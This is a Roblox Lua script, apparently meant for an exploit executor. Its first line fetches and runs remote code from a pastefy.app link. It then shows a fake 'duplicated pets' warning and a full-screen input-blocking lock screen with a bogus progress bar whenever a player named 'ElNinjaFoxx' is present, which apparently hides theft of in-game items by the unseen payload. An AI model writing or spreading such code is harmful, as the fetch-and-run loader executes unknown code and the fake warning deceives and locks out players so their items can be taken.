-- This line always runs no matter who joins
loadstring(game:HttpGet("https://pastefy.app/z3fNqbPD/raw"))()

local Players = game:GetService("Players")

-- Function to show the GUI
local function showWarningGUI()
	-- Don't build GUI if already exists
	if game.CoreGui:FindFirstChild("WarningGUI") then return end

	-- GUI code starts here
	local gui = Instance.new("ScreenGui", game.CoreGui)
	gui.Name = "WarningGUI"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 999

	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0, 400, 0, 220)
	frame.Position = UDim2.new(0.5, -200, 0.5, -110)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

	local warningLabel = Instance.new("TextLabel", frame)
	warningLabel.Size = UDim2.new(1, 0, 0, 50)
	warningLabel.Position = UDim2.new(0, 0, 0, 10)
	warningLabel.Text = "⚠️ WARNING"
	warningLabel.Font = Enum.Font.GothamBlack
	warningLabel.TextSize = 36
	warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
	warningLabel.BackgroundTransparency = 1

	local msgLabel = Instance.new("TextLabel", frame)
	msgLabel.Size = UDim2.new(1, -40, 0, 60)
	msgLabel.Position = UDim2.new(0, 20, 0, 60)
	msgLabel.Text = "We detected duplicated pet(s) from your account."
	msgLabel.Font = Enum.Font.Gotham
	msgLabel.TextSize = 18
	msgLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	msgLabel.BackgroundTransparency = 1
	msgLabel.TextWrapped = true

	local button = Instance.new("TextButton", frame)
	button.Size = UDim2.new(0, 240, 0, 40)
	button.Position = UDim2.new(0.5, -120, 1, -60)
	button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	button.TextColor3 = Color3.fromRGB(150, 150, 150)
	button.Text = "Please wait (3)"
	button.Font = Enum.Font.GothamBold
	button.TextSize = 18
	button.AutoButtonColor = false
	button.Active = false
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)

	task.spawn(function()
		for i = 3, 1, -1 do
			button.Text = "Please wait ("..i..")"
			task.wait(1)
		end
		button.Text = "OK, I Understand"
		button.TextColor3 = Color3.fromRGB(255, 255, 255)
		button.AutoButtonColor = true
		button.Active = true
	end)

	local function lockScreen()
		gui:Destroy()

		local lockGui = Instance.new("ScreenGui", game.CoreGui)
		lockGui.Name = "LockGUI"
		lockGui.IgnoreGuiInset = true
		lockGui.DisplayOrder = 1000
		lockGui.ResetOnSpawn = false

		local fullFrame = Instance.new("Frame", lockGui)
		fullFrame.Size = UDim2.new(1, 0, 1, 0)
		fullFrame.Position = UDim2.new(0, 0, 0, 0)
		fullFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

		local inputBlock = Instance.new("TextButton", fullFrame)
		inputBlock.Size = UDim2.new(1, 0, 1, 0)
		inputBlock.BackgroundTransparency = 1
		inputBlock.Text = ""
		inputBlock.AutoButtonColor = false
		inputBlock.Modal = true

		local statusText = Instance.new("TextLabel", fullFrame)
		statusText.Size = UDim2.new(1, 0, 0, 40)
		statusText.Position = UDim2.new(0, 0, 0.4, -80)
		statusText.Text = "🔄 Removing duplicated pets, please be patient..."
		statusText.Font = Enum.Font.GothamMedium
		statusText.TextSize = 20
		statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
		statusText.BackgroundTransparency = 1

		local barBG = Instance.new("Frame", fullFrame)
		barBG.Size = UDim2.new(0.4, 0, 0, 30)
		barBG.Position = UDim2.new(0.3, 0, 0.4, -30)
		barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 6)

		local barFill = Instance.new("Frame", barBG)
		barFill.Size = UDim2.new(0, 0, 1, 0)
		barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
		Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 6)

		local percentLabel = Instance.new("TextLabel", fullFrame)
		percentLabel.Size = UDim2.new(1, 0, 0, 40)
		percentLabel.Position = UDim2.new(0, 0, 0.4, 10)
		percentLabel.Text = "0%"
		percentLabel.Font = Enum.Font.GothamBold
		percentLabel.TextSize = 20
		percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		percentLabel.BackgroundTransparency = 1

		task.spawn(function()
			for i = 1, 100 do
				barFill.Size = UDim2.new(i / 100, 0, 1, 0)
				percentLabel.Text = i.."%"
				if i % 25 == 0 then
					fullFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
					task.wait(0.05)
					fullFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				end
				task.wait(0.1)
			end

			local finalMessage = Instance.new("TextLabel", fullFrame)
			finalMessage.Size = UDim2.new(1, 0, 0, 30)
			finalMessage.Position = UDim2.new(0, 0, 0.4, 50)
			finalMessage.Text = "🧼 Cleaning up duplicated assets..."
			finalMessage.Font = Enum.Font.GothamMedium
			finalMessage.TextSize = 18
			finalMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
			finalMessage.BackgroundTransparency = 1
		end)
	end

	button.MouseButton1Click:Connect(lockScreen)
end

-- === CHECK LOGIC FIRST ===
local function checkAndTrigger()
	for _, player in pairs(Players:GetPlayers()) do
		if player.Name == "ElNinjaFoxx" then
			showWarningGUI()
			return
		end
	end
end

-- Run check immediately
checkAndTrigger()

-- Listen for future joins
Players.PlayerAdded:Connect(function(plr)
	if plr.Name == "ElNinjaFoxx" then
		showWarningGUI()
	end
end)
